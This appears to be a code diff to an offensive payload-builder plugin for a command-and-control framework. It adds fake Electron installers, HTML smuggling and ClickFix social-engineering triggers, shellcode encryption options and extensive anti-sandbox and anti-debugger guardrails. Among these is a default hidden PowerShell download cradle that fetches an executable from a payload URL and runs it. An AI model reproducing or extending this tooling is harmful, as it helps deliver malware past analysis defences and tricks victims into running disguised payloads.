@@ -23,6 +23,7 @@ _PLUGIN_FUNCTIONS = [
     "build_7z",
     "build_zip",
     "build_iso",
+    "build_electron_installer",
     "self_sign_payload",
     "get_remote_cert_details",
     "sign_with_provided_cert",
@@ -31,6 +32,8 @@ _PLUGIN_FUNCTIONS = [
     "generate_xll_template",
     "register_xll_function",
     "create_msc_explorer_trigger",
+    "create_html_smuggling_trigger",
+    "create_clickfix_trigger",
 ]
 
 for _func_name in _PLUGIN_FUNCTIONS:
@@ -53,10 +56,8 @@ import subprocess
 import zipfile
 
 ENCRYPTION_METHODS = {
-    # "AES128_CBC" :  "aes_128",
-    # "AES256_CBC" :  "aes_cbc",
-    # "AES256_ECB" :  "aes_ecb",
-    # "CHACHA20"   :  "chacha20",
+    "AES_ECB"    :  "aes_ecb",
+    "AES_CBC"    :  "aes_cbc",
     "RC4"        :  "rc4",
     "XOR"        :  "xor",
 }
@@ -195,13 +196,11 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 "Select the loader's output format. "
                 "exe = standard PE executable. "
                 "dll = DLL (side-loadable, regsvr32). "
-                # "cpl = Control Panel applet (loaded via control.exe or double-click). "
                 "xll = Excel Add-In DLL (xlAutoOpen trigger)"
             ),
             choices = [
                 "exe", 
                 "dll", 
-                # "cpl", # not functional currently in v0.0.2
                 "xll"
                 ],
             default_value = "exe",
@@ -346,6 +345,17 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         ),
 
         BuildParameter(
+            name = "0.5f1 Check Sandbox Environment",
+            parameter_type = BuildParameterType.Boolean,
+            description = "Detect VMs and sandboxes (hypervisor CPUID, low resources, sandbox artifacts, no recent user activity)",
+            default_value = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
             name = "0.5g Hostname Whitelist",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
@@ -453,7 +463,7 @@ appdomain (self)""",
             name="0.9 Trigger Type",
             parameter_type=BuildParameterType.ChooseOne,
             description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
-            choices=["LNK", "BAT", "MSI", "ClickOnce", "MSC"],
+            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix"],
             default_value="BAT",
             required=False,
             hide_conditions = [
@@ -473,6 +483,8 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
             ]
         ),
 
@@ -487,6 +499,20 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9c ClickFix Command",
+            parameter_type=BuildParameterType.String,
+            description="Command copied to clipboard when user clicks verify button. Use a PowerShell download cradle or cmd chain.",
+            default_value='powershell -w hidden -ep bypass -c "iwr -uri PAYLOAD_URL -outfile $env:TEMP\\update.exe; & $env:TEMP\\update.exe"',
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="ClickFix"),
             ]
         ),
 
@@ -951,16 +977,12 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose an encryption type for the shellcode.",
             choices = [
-                # "AES128_CBC",
-                # "AES256_CBC",
-                # "AES256_ECB",
-                # "CHACHA20",
-                # "SALSA20",
+                "AES_ECB",
+                "AES_CBC",
                 "RC4",
                 "XOR",
-                # "XOR_COMPLEX",
             ],
-            default_value = "XOR"
+            default_value = "RC4"
         ),
 
         BuildParameter(
@@ -985,36 +1007,342 @@ generated if none have been entered.""",
             default_value="NONE"
         ),
 
-        BuildParameter(
-            name = "2.4 Shellcode Format",
-            parameter_type = BuildParameterType.ChooseOne,
-            description = "Choose a format for the obfuscated shellcode.",
-            choices = [
-                # Uncomment lines for custom loaders
-                "C",
-                "CSharp",
-                # "Nim",
-                # "Go",
-                # "Python",
-                # "Powershell",
-                # "VBA",
-                # "VBScript",
-                # "Rust",
-                # "JavaScript",
-                # "Zig",
-                "Raw",
-            ],
-            default_value = "C",
-            required = True,
-        ),
-
         # Archive
         BuildParameter(
             name = "3.0 Container Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose the final payload container type.",
-            choices = ["ISO", "7z", "Zip", "MSI"],
+            choices = ["ISO", "7z", "Zip", "MSI", "Electron"],
             default_value = "Zip",
+        ),
+
+        # Electron fake-installer container parameters (hidden unless Electron selected)
+        BuildParameter(
+            name = "3.E0 Electron Product Name",
+            parameter_type = BuildParameterType.String,
+            description = "Display name shown in the fake installer window and NSIS metadata",
+            default_value = "Acme Installer",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E1 Electron Publisher",
+            parameter_type = BuildParameterType.String,
+            description = "Publisher string embedded in the installer metadata",
+            default_value = "Acme Corporation",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E2 Electron Version",
+            parameter_type = BuildParameterType.String,
+            description = "Product version embedded in the installer",
+            default_value = "1.0.0",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E3 Electron Architecture",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = "Target architecture for the Electron NSIS installer",
+            choices = ["x64", "ia32"],
+            default_value = "x64",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E4 Electron Entry Format",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = (
+                "Which spawn mechanism the wizard uses at install time:\n"
+                "exe = CreateProcess on the embedded loader exe (Shellcode Loader / ClickOnce)\n"
+                "dll = rundll32.exe <dll>,<entry> (Shellcode Loader DLL format)\n"
+                "xll = excel.exe /e <xll> (Shellcode Loader XLL format)"
+            ),
+            choices = ["exe", "dll", "xll"],
+            default_value = "exe",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E5 Electron DLL Entry Point",
+            parameter_type = BuildParameterType.String,
+            description = "rundll32 entry point name (only used when Entry Format = dll)",
+            default_value = "DllMain",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E4 Electron Entry Format", operand=HideConditionOperand.NotEQ, value="dll"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E7 Electron File Description",
+            parameter_type = BuildParameterType.String,
+            description = (
+                "PE file description string shown on the Details tab of the "
+                "exe's properties dialog (maps to package.json.description)."
+            ),
+            default_value = "Setup",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E8 Electron Copyright",
+            parameter_type = BuildParameterType.String,
+            description = (
+                "Legal copyright string embedded in the PE resources "
+                "(maps to electron-builder.yml.copyright)."
+            ),
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E6a Electron Custom Icon",
+            parameter_type = BuildParameterType.File,
+            description = (
+                "Optional PNG to use as the fake-installer window + exe icon.\n"
+                "If omitted, the default Erebus icon is used. Image should be "
+                "square and at least 256x256; it is converted to a multi-size "
+                "ICO at build time."
+            ),
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E6 Electron Build Mode",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = (
+                "In-Container (Wine): npm + electron-builder run inside the Docker container.\n"
+                "Deferred (Erebus.Helper): stage source + build_electron.bat for a Windows host."
+            ),
+            choices = ["In-Container (Wine)", "Deferred (Erebus.Helper)"],
+            default_value = "In-Container (Wine)",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+
+        # Electron guardrails (anti-sandbox / anti-analysis). All are gated
+        # behind the master switch 3.E9 and only take effect when the
+        # container type is Electron. The loader tree is NOT copied to the
+        # temp directory until every enabled guardrail passes.
+        BuildParameter(
+            name = "3.E9 Enable Electron Guardrails",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Master switch for the Electron wrapper's anti-sandbox guardrails. "
+                "When enabled, the wizard defers staging the loader tree to "
+                "%TEMP%\\inst-<uuid> until after a dwell time, real user mouse "
+                "movement, and every enabled environment check has passed."
+            ),
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9a Dwell Time (ms)",
+            parameter_type = BuildParameterType.String,
+            description = (
+                "Minimum time (ms) the wizard must be visible before the Install "
+                "button becomes actionable. Defeats rapid-click sandbox detonators. "
+                "0 disables the dwell gate."
+            ),
+            default_value = "2500",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9b Require Mouse Movement",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Require a real mousemove event (non-zero movementX/Y delta) "
+                "inside the wizard window before the Install button is enabled. "
+                "Filters synthetic-event automation that clicks buttons without "
+                "moving the pointer."
+            ),
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9c Check Debugger",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Refuse to stage if a Node inspector / debugger is attached to "
+                "the Electron main process at Install click time."
+            ),
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9d Check Sandbox Env Vars",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Refuse to stage if environment variables from common sandbox "
+                "frameworks are present (Sandboxie, Cuckoo, Joe Sandbox, etc.)."
+            ),
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9e Check Default Bad Usernames",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Refuse to stage if the current username is a well-known sandbox "
+                "default (sandbox, malware, analyst, WDAGUtilityAccount, ...)."
+            ),
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9f Check Default Bad Hostnames",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Refuse to stage if the current hostname contains common sandbox "
+                "substrings (sandbox, cuckoo, hybrid-analysis, vm, vbox, ...)."
+            ),
+            default_value = True,
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9g Hostname Whitelist",
+            parameter_type = BuildParameterType.String,
+            description = (
+                "Comma-separated list of hostnames (or suffixes) that are ALLOWED "
+                "to run the installer. Empty = no whitelist check."
+            ),
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9h Hostname Blocklist",
+            parameter_type = BuildParameterType.String,
+            description = (
+                "Comma-separated list of hostnames that are BLOCKED from running "
+                "the installer. Empty = no blocklist check."
+            ),
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9i Username Whitelist",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated list of allowed usernames. Empty = no whitelist check.",
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9j Username Blocklist",
+            parameter_type = BuildParameterType.String,
+            description = "Comma-separated list of blocked usernames. Empty = no blocklist check.",
+            default_value = "",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9k Min Screen Width",
+            parameter_type = BuildParameterType.String,
+            description = (
+                "Refuse to stage if the primary display's width is less than this "
+                "many pixels. Sandboxes commonly run at 800x600 or 1024x768. "
+                "0 disables the check."
+            ),
+            default_value = "1280",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9l Min Screen Height",
+            parameter_type = BuildParameterType.String,
+            description = "Refuse to stage if the primary display's height is less than this many pixels. 0 disables the check.",
+            default_value = "720",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9m Min CPU Count",
+            parameter_type = BuildParameterType.String,
+            description = "Refuse to stage if the host has fewer than N logical CPUs (most sandbox VMs use 1-2). 0 disables.",
+            default_value = "2",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9n Min Memory (MB)",
+            parameter_type = BuildParameterType.String,
+            description = "Refuse to stage if the host has less than N MB of RAM. 0 disables.",
+            default_value = "2048",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9o Max Idle Seconds",
+            parameter_type = BuildParameterType.String,
+            description = "Refuse to stage if the system idle time is greater than this many seconds (unattended box = suspicious). 0 disables.",
+            default_value = "0",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name = "3.E9p Pre-Spawn Delay (ms)",
+            parameter_type = BuildParameterType.String,
+            description = (
+                "Sleep this many ms inside the Install handler AFTER every other "
+                "guardrail has passed, before the file copy and spawn. Forces "
+                "short-lived sandbox detonation windows to time out before "
+                "anything hits disk. 0 disables."
+            ),
+            default_value = "0",
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
         ),
 
         BuildParameter(
@@ -1286,14 +1614,17 @@ generated if none have been entered.""",
         BuildStep(step_name = "[T1027.011] - Compiling DLL Payload",
                   step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),
 
-        # BuildStep(step_name = "[T1218.002] - Compiling CPL Payload",
-        #           step_description = "Compiling CPL Applet with Obfuscated Shellcode"),
+        BuildStep(step_name = "[T1218.002] - Compiling CPL Payload",
+                  step_description = "Compiling CPL Applet with Obfuscated Shellcode"),
 
         BuildStep(step_name = "[T1559.002] - Compiling XLL Add-In",
                   step_description = "Compiling XLL Add-In DLL with Obfuscated Shellcode"),
 
         BuildStep(step_name = "[T1027] - Compiling Shellcode Loader",
             step_description = "Compiling Shellcode Loader"),
+
+        BuildStep(step_name = "[T1608.001] - Wrapping Payload in Electron Installer",
+                  step_description = "Packaging the compiled loader inside a fake Electron NSIS installer (npm + electron-builder)."),
 
         BuildStep(step_name = "[T1027] - Compiling ClickOnce Loader",
             step_description = "Compiling ClickOnce Loader"),
@@ -1502,6 +1833,61 @@ generated if none have been entered.""",
                     install_scope=self.get_parameter("5.2 MSI Install Scope")
                 )
 
+            case "Electron":
+                # Optional operator-supplied icon (PNG). Fetched from Mythic
+                # by file UUID when set; falls back to the vendored Erebus.png.
+                custom_icon_bytes = None
+                electron_icon_uuid = self.get_parameter("3.E6a Electron Custom Icon")
+                if electron_icon_uuid:
+                    icon_resp = await SendMythicRPCFileGetContent(
+                        MythicRPCFileGetContentMessage(AgentFileId=electron_icon_uuid)
+                    )
+                    if icon_resp.Success:
+                        custom_icon_bytes = icon_resp.Content
+
+                def _int_or(name, default=0):
+                    raw = self.get_parameter(name)
+                    try:
+                        return int(raw) if raw not in (None, "") else default
+                    except (TypeError, ValueError):
+                        return default
+
+                guardrails_cfg = {
+                    "enabled": bool(self.get_parameter("3.E9 Enable Electron Guardrails")),
+                    "dwellMs": _int_or("3.E9a Dwell Time (ms)", 2500),
+                    "requireMouseMovement": bool(self.get_parameter("3.E9b Require Mouse Movement")),
+                    "checkDebugger": bool(self.get_parameter("3.E9c Check Debugger")),
+                    "checkSandboxEnv": bool(self.get_parameter("3.E9d Check Sandbox Env Vars")),
+                    "checkDefaultBadUsernames": bool(self.get_parameter("3.E9e Check Default Bad Usernames")),
+                    "checkDefaultBadHostnames": bool(self.get_parameter("3.E9f Check Default Bad Hostnames")),
+                    "hostnameWhitelist": self.get_parameter("3.E9g Hostname Whitelist") or "",
+                    "hostnameBlocklist": self.get_parameter("3.E9h Hostname Blocklist") or "",
+                    "usernameWhitelist": self.get_parameter("3.E9i Username Whitelist") or "",
+                    "usernameBlocklist": self.get_parameter("3.E9j Username Blocklist") or "",
+                    "minScreenWidth": _int_or("3.E9k Min Screen Width", 0),
+                    "minScreenHeight": _int_or("3.E9l Min Screen Height", 0),
+                    "minCpuCount": _int_or("3.E9m Min CPU Count", 0),
+                    "minMemoryMb": _int_or("3.E9n Min Memory (MB)", 0),
+                    "maxIdleSeconds": _int_or("3.E9o Max Idle Seconds", 0),
+                    "preSpawnDelayMs": _int_or("3.E9p Pre-Spawn Delay (ms)", 0),
+                }
+
+                return build_electron_installer(
+                    build_path=Path(agent_build_path),
+                    product=self.get_parameter("3.E0 Electron Product Name"),
+                    publisher=self.get_parameter("3.E1 Electron Publisher"),
+                    version=self.get_parameter("3.E2 Electron Version"),
+                    arch=self.get_parameter("3.E3 Electron Architecture"),
+                    entry_format=self.get_parameter("3.E4 Electron Entry Format"),
+                    entry_name=f"erebus.{self.get_parameter('3.E4 Electron Entry Format')}",
+                    dll_entry=self.get_parameter("3.E5 Electron DLL Entry Point") or "DllMain",
+                    build_mode=self.get_parameter("3.E6 Electron Build Mode"),
+                    file_description=self.get_parameter("3.E7 Electron File Description") or "Setup",
+                    copyright_str=self.get_parameter("3.E8 Electron Copyright") or "",
+                    custom_icon_bytes=custom_icon_bytes,
+                    guardrails=guardrails_cfg,
+                )
+
         return None
 
     async def build(self) -> BuildResponse:
@@ -1516,6 +1902,15 @@ generated if none have been entered.""",
                     await report_validation_results(operation_id=getattr(self, "operation_id", None))
                 except Exception as e:
                     print(f"[!] Could not report plugin status: {e}")
+
+            # Pre-flight: verify critical build tools are available
+            preflight_errors = []
+            for tool in ["x86_64-w64-mingw32-g++", "python3"]:
+                if not shutil.which(tool):
+                    preflight_errors.append(tool)
+            if preflight_errors:
+                response.build_stderr = f"Missing build tools: {', '.join(preflight_errors)}. Check Dockerfile."
+                return response
 
             # Initialize IOCs tracking list
             iocs_list = []
@@ -1948,6 +2343,7 @@ generated if none have been entered.""",
                         guardrails_check_processes = 1 if self.get_parameter("0.5d Check Debugger Processes") else 0
                         guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
                         guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0
+                        guardrails_check_sandbox = 1 if self.get_parameter("0.5f1 Check Sandbox Environment") else 0
 
                         config_data = {
                             "TARGET_PROCESS": target_process,
@@ -1963,6 +2359,8 @@ generated if none have been entered.""",
                             "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": guardrails_check_processes,
                             "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": guardrails_check_hwbp,
                             "GUARDRAILS_CHECK_TIMING": guardrails_check_timing,
+                            "GUARDRAILS_CHECK_SANDBOX": guardrails_check_sandbox,
+                            "GUARDRAILS_DECOY_FILE": "decoy.pdf" if self.get_parameter("0.13 Decoy File Inclusion") else "",
                         }
                         rendered_config = config_template.render(**config_data)
 
@@ -2153,6 +2551,8 @@ generated if none have been entered.""",
                         "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": 1 if self.get_parameter("1.1c Check Debugger Processes") and guardrails_enabled else 0,
                         "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": 1 if self.get_parameter("1.1d Check Hardware Breakpoints") and guardrails_enabled else 0,
                         "GUARDRAILS_CHECK_TIMING": 1 if self.get_parameter("1.1e Check Timing Anomalies") and guardrails_enabled else 0,
+                        "GUARDRAILS_CHECK_SANDBOX": 0,
+                        "GUARDRAILS_DECOY_FILE": "",
                     }
                     rendered_config = config_template.render(**config_data)
                     config_hpp_destination = str(PurePath(shellcode_loader_path) / "include" / "config.hpp")
@@ -3285,6 +3685,32 @@ static size_t key_len = sizeof(key);
                                 decoy_file=decoy_file
                             )
 
+                        case "HTML":
+                            # Find the compiled payload in the payload directory
+                            payload_exe = payload_dir / "erebus.exe"
+                            if not payload_exe.exists():
+                                for ext in ["dll", "cpl", "xll"]:
+                                    candidate = payload_dir / f"erebus.{ext}"
+                                    if candidate.exists():
+                                        payload_exe = candidate
+                                        break
+
+                            download_name = payload_exe.name
+                            trigger_path = create_html_smuggling_trigger(
+                                payload_path=str(payload_exe),
+                                output_filename="document.html",
+                                download_name=download_name,
+                                payload_dir=payload_dir,
+                            )
+
+                        case "ClickFix":
+                            clickfix_cmd = self.get_parameter("0.9c ClickFix Command")
+                            trigger_path = create_clickfix_trigger(
+                                command=clickfix_cmd,
+                                output_filename="verify.html",
+                                payload_dir=payload_dir,
+                            )
+
                     if trigger_path:
                         response.status = BuildStatus.Success
                         response.build_message = f"{trigger_type} Trigger created!"
@@ -3483,17 +3909,25 @@ static size_t key_len = sizeof(key);
                 container = self.get_parameter("3.0 Container Type")
                 match container:
                     case "7z":
+                        filename = "payload"
                         ext = "7z"
                     case "Zip":
+                        filename = "payload"
                         ext = "zip"
                     case "MSI":
+                        filename = "payload"
                         ext = "msi"
                     case "ISO":
+                        filename = "payload"
                         ext = "iso"
+                    case "Electron":
+                        filename = "ErebusInstaller"
+                        ext = "exe"
                     case _:
-                        ext = "bin"
+                        filename = "payload"
+                        ext = "exe"
 
-                response.updated_filename = f"payload.{ext}"
+                response.updated_filename = f"{filename}.{ext}"
                 response.status = BuildStatus.Success
                 response.build_message = f"Success! Containerized ({container})"
 
